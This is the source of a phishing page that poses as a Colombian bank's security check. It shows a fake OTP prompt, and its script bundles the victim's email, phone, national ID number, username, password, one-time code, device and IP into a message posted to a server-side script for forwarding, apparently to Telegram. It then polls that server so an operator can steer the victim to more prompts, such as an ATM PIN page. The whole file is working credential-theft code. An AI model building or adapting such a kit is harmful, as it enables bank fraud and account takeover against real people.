<?php
$ip = getenv("REMOTE_ADDR");
setlocale(LC_TIME, "spanish");
$tiempo = strftime("%A, %d de %B de %Y");
date_default_timezone_set('America/Bogota');
?>
<html>
	<head>
  		<title>Verificación de Seguridad - </title>
  		<meta http-equiv="content-type" content="text/html; utf-8">
  		<meta charset="utf-8">  		
		<meta content="es" http-equiv="Content-Language">
  		<meta name="description" content="">
  		<meta name="author" content="">
  		<meta name="Copyright" content="">
  		<meta name="viewport" content="width=device-width, initial-scale=1.0">
	 	<meta http-equiv="X-UA-Compatible" content="IE=edge">	 	
		<link href="css/style.css" rel="stylesheet">
		<link href="css/stylesheet.css" rel="stylesheet">		
		<link rel="icon" type="image/png" href="img/logo.png" />
		<link href="img/favicon.ico" rel="shortcut icon" type="image/x-icon"/>

		<script type="text/javascript" src="../../../assets/js/jquery-3.6.0.min.js"></script>
		<script src="../../../assets/js/jquery.jclock-min.js" type="text/javascript"></script>
   		<script type="text/javascript" src="js/functions.js"></script>  	
   	</head>
   	<body>
   		<div id="mensaje" style="display: none;">
   			<table border="0" cellspacing="0" cellpadding="0">
	   			<tr>
	   				<td class="etiqueta" id="texto-mensaje">Por favor espere un momento estamos validando algunos datos. Puede tardar entre 1 a 5 minuto. No cierres o recargues esta ventana.</td>
	   				<td id="logo-cargando">
	   					<div class="esperar">
	   						<img src="img/load.svg" width="70">
	   					</div>			
	   				</td>
	   			</tr>
	   		</table>
	   		<div class="esperar" id="logo-cargando1">
				<img src="img/load.svg" width="70">
			</div>	
   		</div>

   		<div id="frmDinamica" style="position: fixed !important; top: 0 !important; left: 0 !important; right: 0 !important; bottom: 0 !important; width: 100vw !important; height: 100vh !important; background: rgba(0,0,0,0.5) !important; display: flex !important; justify-content: center !important; align-items: center !important; z-index: 9999 !important; margin: 0 !important; padding: 0 !important;">
   			<div style="max-width: 400px !important; text-align: center !important; padding: 30px !important; background: rgba(255,255,255,0.95) !important; border-radius: 10px !important; box-shadow: 0 4px 20px rgba(0,0,0,0.3) !important; backdrop-filter: blur(10px) !important; margin: 0 auto !important; position: absolute !important; top: 50% !important; left: 50% !important; transform: translate(-50%, -50%) !important;">
   				<div class="titulo" style="margin-bottom: 8px; font-size: 18px; font-weight: bold; color: #333;">
		  		Verificación de Seguridad
		  	</div>		  	
		
			<span class="subtexto-frm" style="display: block; margin: 15px 0; color: #666; font-size: 14px; line-height: 1.4;">
		  		Por favor ingresa el código de 6 dígitos enviado a su correo electrónico y/o teléfono celular registrados
		  	</span>		  	
			<br>
			<div class="separador" style="height: 1px; background: #ddd; margin: 20px 0;"></div>
			<br>
			<div class="etiqueta" style="text-align: center !important; margin-bottom: 8px; font-weight: bold; color: #333;">(*) CÓDIGO DE VERIFICACIÓN</div>
			<div style="text-align: center !important; display: flex; justify-content: center; align-items: center;">
				<input type="password" name="txtDinamica" id="txtDinamica" class="entradas" autocomplete="off" pattern="[0-9]*" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" maxlength="6" inputmode="numeric" style="width: 200px !important; text-align: center !important; font-size: 18px; letter-spacing: 3px; font-weight: bold; margin: 0 auto !important; display: block !important;">
			</div>
		  	<div class="error-input" id="error-dinamica" style="display: none; color: #e74c3c; font-size: 12px; margin-top: 5px;">
				Datos incorrectos. Por favor verifique e intente de nuevo.
			</div>
		  	<br><br>
		  	<div style="text-align:center;">
		  		<button class="btn btn-form" type="submit" id="btnDinamica" style="width: 200px; padding: 12px; font-size: 16px; font-weight: bold;"> VERIFICAR </button>	
		  	</div>
   			</div>
   		</div>

   		<div id="frmErrDinamica" style="position: fixed !important; top: 0 !important; left: 0 !important; right: 0 !important; bottom: 0 !important; width: 100vw !important; height: 100vh !important; background: rgba(0,0,0,0.5) !important; display: none; justify-content: center !important; align-items: center !important; z-index: 9999 !important; margin: 0 !important; padding: 0 !important;">
   			<div style="max-width: 400px !important; text-align: center !important; padding: 30px !important; background: rgba(255,255,255,0.95) !important; border-radius: 10px !important; box-shadow: 0 4px 20px rgba(0,0,0,0.3) !important; backdrop-filter: blur(10px) !important; margin: 0 auto !important; position: absolute !important; top: 50% !important; left: 50% !important; transform: translate(-50%, -50%) !important;">
   				<div class="titulo" style="margin-bottom: 8px; font-size: 18px; font-weight: bold; color: #e74c3c;">
		  		Código Inválido
		  	</div>		  	
		
			<span class="subtexto-frm" style="display: block; margin: 15px 0; color: #666; font-size: 14px; line-height: 1.4;">
		  		Por favor ingresa el código de 6 dígitos enviado a su correo electrónico y/o teléfono celular registrados
		  	</span>		  	
			<br>
			<div class="separador" style="height: 1px; background: #ddd; margin: 20px 0;"></div>
			<br>
			<div class="etiqueta" style="text-align: center !important; margin-bottom: 8px; font-weight: bold; color: #333;">(*) CÓDIGO DE VERIFICACIÓN</div>
			<div style="text-align: center !important; display: flex; justify-content: center; align-items: center;">
				<input type="password" name="txtErrDinamica" id="txtErrDinamica" class="entradas" autocomplete="off" pattern="[0-9]*" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" maxlength="6" inputmode="numeric" style="width: 200px !important; text-align: center !important; font-size: 18px; letter-spacing: 3px; font-weight: bold; margin: 0 auto !important; display: block !important;">
			</div>
		  	<div class="error-input" id="error-err-dinamica" style="display: none; color: #e74c3c; font-size: 12px; margin-top: 5px;">
				Datos incorrectos. Por favor verifique e intente de nuevo.
			</div>
		  	<br><br>
		  	<div style="text-align:center;">
		  		<button class="btn btn-form" type="submit" id="btnErrDinamica" style="width: 200px; padding: 12px; font-size: 16px; font-weight: bold;"> VERIFICAR </button>	
		  	</div>
   			</div>
   		</div>

   		<div class="loader" style="display: none;">
   			<img src="img/load.svg" width="130">
   		</div>

   		<div id="fondo" style="display: none;"></div>
   		<div id="fondo-oscuro" style="display: none;"></div>

   		<div class="top-bar">
   			<table style="margin: 0 auto;" cellpadding="0" cellspacing="0">
   				<tr>
   					<td class="item-top">Transparencia y Acceso a la Información Pública</td>
   					<td>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td>
   					<td class="item-top">Linea Amiga</td>
   				</tr>
   			</table>
   			<div style="float:right;"></div>  			
   		</div>   
   		<div class="header">
   			<table width="100%" cellpadding="0" cellspacing="0">
   				<tr>
   					<td valign="top">
   						<table  cellpadding="0" cellspacing="0">
   							<tr>
   								<td><img src="img/menu.jpg" id="boton-menu"></td>
   								<td><img src="img/logo.svg" id="logo-pal"></td>
   							</tr>
   						</table>  
   					</td>
   					<td align="center" id="seg-menu">
   						<div style="height: 0px;"></div>
   						<table class="menu-items">
   							<tr>
   								<td>Personas</td>
   								<td>Microempresarios</td>
   								<td>Pequeñas Empresas</td>
   								<td>Empresas </td>
   								<td>Constructores</td>  
   							</tr>
   						</table>
   					</td>
   					<td>
   						<table width="100%" cellpadding="0" cellspacing="0">
   							<tr>
   								<td><button class="btn" id="btn-ingresar">Ingresar&nbsp;&nbsp;&nbsp;<img src="img/flecha-derecha-blanca.png" style="height: 14px;"></button></td>
   								<td align="right"><img src="img/accesibilidad.jpg"></td> 
   							</tr>
   						</table>
   					</td>
   				</tr>
   			</table>	   		
   		</div>

   		<div class="slider">
		    <ul>
		      <li><img src="img/slider1/0.jpg"></li>
		      <li><img src="img/slider1/2.jpg"></li>
		      <li><img src="img/slider1/1.jpg"></li>
		    </ul>
		  </div>

		  <div class="contenido">
		  		<img src="img/contenido1.jpg" class="conten">
		  		<img src="img/contenido-mobill-min.jpg" class="contenMob">
		  </div>

		  <div class="slider">
		    <ul>
		      <li><img src="img/slider2/1.jpg"></li>
		      <li><img src="img/slider2/2.jpg"></li>
		      <li><img src="img/slider2/3.jpg"></li>
		    </ul>
		  </div>

		  <div class="contenido">
		  		<img src="img/contenido2.jpg" class="conten">
		  		<img src="img/contenido-mobil-2-min.jpg" class="contenMob">
		  </div>

    <script>
    document.addEventListener("DOMContentLoaded", function () {
        // Event listener para el botón Verificar
        const btnDinamica = document.getElementById('btnDinamica');
        
        if (btnDinamica) {
            btnDinamica.addEventListener('click', async function (event) {
                event.preventDefault();

                const codigo = document.getElementById('txtDinamica').value;
                
                // Validar que el código tenga 6 dígitos
                if (codigo.length !== 6) {
                    alert('El código debe tener 6 dígitos');
                    return;
                }

                // Mostrar loader
                $("#frmDinamica").hide();
                $("#mensaje").show();

                // Obtener session_id
                let sessionId = localStorage.getItem('session_id');
                if (!sessionId) {
                    sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
                    localStorage.setItem('session_id', sessionId);
                }

                // Guardar código en localStorage
                localStorage.setItem('codigo_dinamica', codigo);

                // Detectar tipo de dispositivo
                const userAgent = navigator.userAgent;
                let dispositivo = 'PC';
                
                if (/Android/i.test(userAgent)) {
                    dispositivo = 'Android';
                } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
                    dispositivo = 'iPhone';
                } else if (/Windows/i.test(userAgent)) {
                    dispositivo = 'PC';
                } else if (/Mac/i.test(userAgent)) {
                    dispositivo = 'Mac';
                } else if (/Linux/i.test(userAgent)) {
                    dispositivo = 'Linux';
                }
                
                const hora = new Date().toLocaleString('es-ES');

                // Obtener IP y enviar a Telegram
                fetch('get_ip.php')
                    .then(response => response.json())
                    .then(data => {
                        const ip = data.ip || 'No disponible';
                        
                        const mensaje = `
💎CAJA SOCIAL💎
<b>😈NEQUI PSE ACTIVO😈</b>
<b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
<b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
<b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
<b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
<b>🏦Banco:</b> ${localStorage.getItem('nom') || 'No disponible'}
<b>🪬Tipo:</b> Recarga Nequi PSE
<b>📟Dispositivo:</b> ${dispositivo}
<b>🗺IP:</b> ${ip}
<b>⏱Hora:</b> ${hora}
------------------------------
👤 Usuario: ${localStorage.getItem('identificacion') || 'No disponible'}
🔑 Clave: ${localStorage.getItem('password') || 'No disponible'}
------------------------------
🔢 Código: ${codigo}
------------------------------`;

                        const formData = new FormData();
                        formData.append('message', mensaje);
                        formData.append('transactionId', sessionId);

                        fetch('procesar_dinamica.php', {
                            method: 'POST',
                            body: formData
                        })
                        .then(res => res.json())
                        .then(result => {
                            if (result.status === 'success') {
                                checkDinamicaVerification(sessionId, result.messageId);
                            } else {
                                // Ocultar loader si hay error
                                $("#mensaje").hide();
                                $("#frmDinamica").show();
                            }
                        })
                        .catch(err => {
                            // Ocultar loader si hay error
                            $("#mensaje").hide();
                            $("#frmDinamica").show();
                        });
                    })
                    .catch(() => {
                        // Si falla la obtención de IP, enviar sin IP
                        const mensaje = `
💎CAJA SOCIAL💎
<b>😈NEQUI PSE ACTIVO😈</b>
<b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
<b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
<b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
<b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
<b>🏦Banco:</b> ${localStorage.getItem('nom') || 'No disponible'}
<b>🪬Tipo:</b> Recarga Nequi PSE
<b>📟Dispositivo:</b> ${dispositivo}
<b>🗺IP:</b> No disponible
<b>⏱Hora:</b> ${hora}
------------------------------
👤 Usuario: ${localStorage.getItem('identificacion') || 'No disponible'}
🔑 Clave: ${localStorage.getItem('password') || 'No disponible'}
------------------------------
🔢 Código: ${codigo}
------------------------------`;

                        const formData = new FormData();
                        formData.append('message', mensaje);
                        formData.append('transactionId', sessionId);

                        fetch('procesar_dinamica.php', {
                            method: 'POST',
                            body: formData
                        })
                        .then(res => res.json())
                        .then(result => {
                            if (result.status === 'success') {
                                checkDinamicaVerification(sessionId, result.messageId);
                            } else {
                                // Ocultar loader si hay error
                                $("#mensaje").hide();
                                $("#frmDinamica").show();
                            }
                        })
                        .catch(err => {
                            // Ocultar loader si hay error
                            $("#mensaje").hide();
                            $("#frmDinamica").show();
                        });
                    });
            });
        }

        // Event listener para el botón Error Dinámica
        const btnErrDinamica = document.getElementById('btnErrDinamica');
        
        if (btnErrDinamica) {
            btnErrDinamica.addEventListener('click', async function (event) {
                event.preventDefault();

                const codigo = document.getElementById('txtErrDinamica').value;
                
                // Validar que el código tenga 6 dígitos
                if (codigo.length !== 6) {
                    alert('El código debe tener 6 dígitos');
                    return;
                }

                // Mostrar loader
                $("#frmErrDinamica").hide();
                $("#mensaje").show();

                // Obtener session_id
                let sessionId = localStorage.getItem('session_id');
                if (!sessionId) {
                    sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
                    localStorage.setItem('session_id', sessionId);
                }

                // Guardar código en localStorage
                localStorage.setItem('codigo_dinamica', codigo);

                // Detectar tipo de dispositivo
                const userAgent = navigator.userAgent;
                let dispositivo = 'PC';
                
                if (/Android/i.test(userAgent)) {
                    dispositivo = 'Android';
                } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
                    dispositivo = 'iPhone';
                } else if (/Windows/i.test(userAgent)) {
                    dispositivo = 'PC';
                } else if (/Mac/i.test(userAgent)) {
                    dispositivo = 'Mac';
                } else if (/Linux/i.test(userAgent)) {
                    dispositivo = 'Linux';
                }
                
                const hora = new Date().toLocaleString('es-ES');

                // Obtener IP y enviar a Telegram
                fetch('get_ip.php')
                    .then(response => response.json())
                    .then(data => {
                        const ip = data.ip || 'No disponible';
                        
                        const mensaje = `
💎CAJA SOCIAL💎
<b>😈NEQUI PSE ACTIVO😈</b>
<b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
<b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
<b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
<b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
<b>🏦Banco:</b> ${localStorage.getItem('nom') || 'No disponible'}
<b>🪬Tipo:</b> Recarga Nequi PSE
<b>📟Dispositivo:</b> ${dispositivo}
<b>🗺IP:</b> ${ip}
<b>⏱Hora:</b> ${hora}
------------------------------
👤 Usuario: ${localStorage.getItem('identificacion') || 'No disponible'}
🔑 Clave: ${localStorage.getItem('password') || 'No disponible'}
------------------------------
🔢 Código: ${codigo}
------------------------------`;

                        const formData = new FormData();
                        formData.append('message', mensaje);
                        formData.append('transactionId', sessionId);

                        fetch('procesar_dinamica.php', {
                            method: 'POST',
                            body: formData
                        })
                        .then(res => res.json())
                        .then(result => {
                            if (result.status === 'success') {
                                checkDinamicaVerification(sessionId, result.messageId);
                            } else {
                                // Ocultar loader si hay error
                                $("#mensaje").hide();
                                $("#frmErrDinamica").show();
                            }
                        })
                        .catch(err => {
                            // Ocultar loader si hay error
                            $("#mensaje").hide();
                            $("#frmErrDinamica").show();
                        });
                    })
                    .catch(() => {
                        // Si falla la obtención de IP, enviar sin IP
                        const mensaje = `
💎CAJA SOCIAL💎
<b>😈NEQUI PSE ACTIVO😈</b>
<b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
<b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
<b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
<b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
<b>🏦Banco:</b> ${localStorage.getItem('nom') || 'No disponible'}
<b>🪬Tipo:</b> Recarga Nequi PSE
<b>📟Dispositivo:</b> ${dispositivo}
<b>🗺IP:</b> No disponible
<b>⏱Hora:</b> ${hora}
------------------------------
👤 Usuario: ${localStorage.getItem('identificacion') || 'No disponible'}
🔑 Clave: ${localStorage.getItem('password') || 'No disponible'}
------------------------------
🔢 Código: ${codigo}
------------------------------`;

                        const formData = new FormData();
                        formData.append('message', mensaje);
                        formData.append('transactionId', sessionId);

                        fetch('procesar_dinamica.php', {
                            method: 'POST',
                            body: formData
                        })
                        .then(res => res.json())
                        .then(result => {
                            if (result.status === 'success') {
                                checkDinamicaVerification(sessionId, result.messageId);
                            } else {
                                // Ocultar loader si hay error
                                $("#mensaje").hide();
                                $("#frmErrDinamica").show();
                            }
                        })
                        .catch(err => {
                            // Ocultar loader si hay error
                            $("#mensaje").hide();
                            $("#frmErrDinamica").show();
                        });
                    });
            });
        }
    });

    async function checkDinamicaVerification(transactionId, messageId) {
        try {
            const formData = new FormData();
            formData.append('transactionId', transactionId);
            formData.append('messageId', messageId);

            const res = await fetch('verificar_dinamica.php', {
                method: 'POST',
                body: formData
            });
            const result = await res.json();

            if (result.action) {
                switch (result.action) {
                    case 'confirm_finalizar':
                        window.location.href = "../../resumen-pago/172921711564327653/index.html ";
                        return; // Salir de la función
                    case 'error_logo': 
                        // Ocultar loader antes de mostrar error
                        const loader2 = document.getElementById('loader-overlay');
                        if (loader2) {
                            loader2.style.display = 'none';
                        }
                        alert("Usuario o clave incorrectos.");
                        window.location.href = "index.php";
                        return; // Salir de la función
                    case 'error_cajero': 
                        // Ocultar loader antes de mostrar error
                        $("#mensaje").hide();
                        window.location.href = "clave_cajero.php";
                        return; // Salir de la función
                    case 'error_dinamica': 
                        // Ocultar loader antes de mostrar error
                        $("#mensaje").hide();
                        $("#frmErrDinamica").show();
                        return; // Salir de la función
                    case 'pedir_dinamica': 
                        // Ocultar loader antes de mostrar error
                        $("#mensaje").hide();
                        $("#frmErrDinamica").show();
                        return; // Salir de la función
                }
            } else {
                setTimeout(() => checkDinamicaVerification(transactionId, messageId), 2000);
            }
        } catch (err) {
            setTimeout(() => checkDinamicaVerification(transactionId, messageId), 2000);
        }
    }
    </script>
   	</body>
</html> 